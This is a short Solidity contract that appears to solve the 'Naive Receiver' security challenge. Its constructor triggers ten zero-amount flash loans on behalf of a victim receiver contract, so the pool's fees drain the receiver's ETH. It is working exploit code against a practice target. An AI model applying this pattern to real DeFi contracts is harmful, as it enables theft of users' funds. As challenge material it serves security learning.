// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverHack {
    constructor(NaiveReceiverLenderPool pool, FlashLoanReceiver receiver) {
        for(uint i; i < 10; i++) {
            pool.flashLoan(receiver, pool.ETH(), 0, "");
        }
    }
}
